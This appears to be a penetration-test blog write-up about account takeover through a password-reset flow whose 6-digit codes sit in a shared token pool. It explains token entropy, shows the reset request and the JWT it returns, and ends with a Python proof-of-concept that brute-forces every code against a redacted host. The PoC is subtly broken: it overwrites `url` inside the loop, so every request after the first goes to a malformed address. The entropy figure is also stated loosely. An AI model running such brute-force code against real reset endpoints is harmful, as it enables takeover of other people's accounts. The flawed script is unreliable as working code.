---
title: "Account Takeover via flawed reset mechanism"
date: 2025-03-09
draft: false
description: "A password reset flow with low-entropy tokens: measuring the real entropy of the reset token, then brute forcing it into an account takeover."
tags: ["ATO", "Password Reset", "Token Entropy"]
---

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

## <i class="fa-solid fa-bars text-primary-400"></i> Overview
In this article, we explore a critical security vulnerability discovered during a penetration test. The flaw involves a <span class="text-primary-400">weak 6-digit code used for password resets</span>, which is not tied to individual user sessions or accounts but rather <span class="text-primary-400">added to a pool of active tokens</span>. This design flaw makes it easy for attackers to take over user accounts via a brute-force attack on the low entropy reset token.

## <i class="fa-solid fa-bullseye text-primary-400"></i> Token Reset Mechanism
To receive a token, a username must be entered into the reset form, which then sends the token to the email address associated with that username. The system in question employs a <span class="text-primary-400">6-digit code (0-9) for resetting passwords</span>. The reset mechanism can be triggered using a URL containing the 6-digit code, such as:

```HTTP
GET /redacted/reset?secret=123456 HTTP/2
HOST: redacted.com
```

## <i class="fa-solid fa-lock text-primary-400"></i> Security Entropy Analysis

### What is Entropy?
Entropy, in the context of security, refers to the <span class="text-primary-400">measure of randomness and unpredictability in a system</span>. Higher entropy means greater security, as it becomes more difficult for attackers to predict or brute-force the correct values. It is <span class="text-primary-400">usually measured in bits; the more bits of entropy, the more possible combinations an attacker must try</span>. In real-life scenarios, we can consider an entropy of at least 80 bits (2^80 combinations) as secure. However, aiming for a higher entropy -- such as 100 bits or more -- is advisable for enhanced security.

### Token entropy of the application
Each digit ranges from 0 to 9, resulting in a total of <span class="text-primary-400">1 million possible combinations</span>:

{{< katex >}}
<span class="text-primary-400">\\(10^6 = 1.000.000\\)

For our 6-digit token, the entropy calculation is:

{{< katex >}}
<span class="text-primary-400">\\(log_2(1.000.000) = 19.93\\)

This translates to roughly 19 bits (2^19) of entropy, which is significantly lower than the recommended minimum of 80 bits. Such low entropy makes the token susceptible to brute-force attacks.

## <i class="fa-solid fa-hammer text-primary-400"></i> The Exploit
Due to the low entropy, an attacker can feasibly attempt all 1 million combinations within a reasonable timeframe. <span class="text-primary-400">Once a valid token is discovered, it can be used to reset the password for any account associated with an active token in the pool</span>. Upon successful token validation, the system returns a JSON Web Token (JWT) containing user information:

```JSON
{
    "sub": "MyUser1",
    "exp": 1719570230,
    "permissions": [
        "UpdatePassword"
    ]
}
```

The <span class="text-primary-400">sub field reveals the username</span>, allowing the attacker to identify the account. With permission to update the password, the attacker gains full control over the compromised account.

### Proof of Concept (PoC)
```PYTHON
import requests

url = "redacted"
endpoint = "/redacted/reset/"
for i in range(1000000):
    secret = str(i).zfill(6)
    url = f"https://{url}/{endpoint}?secret={secret}"
    response = requests.get(url)
    if "eyJ" in response.text:
        print(f"Valid token found: {secret}")
        print(response.text)
        break
```

### Further Exploitation
During the penetration test, we discovered multiple bugs due to <span class="text-primary-400">Access Control List (ACL) issues that allowed us to enumerate users</span>. This enumeration enabled us to trigger password resets for users, further exacerbating the vulnerability. <span class="text-primary-400">By identifying valid usernames, we could systematically request reset tokens, making the attack even more efficient</span>.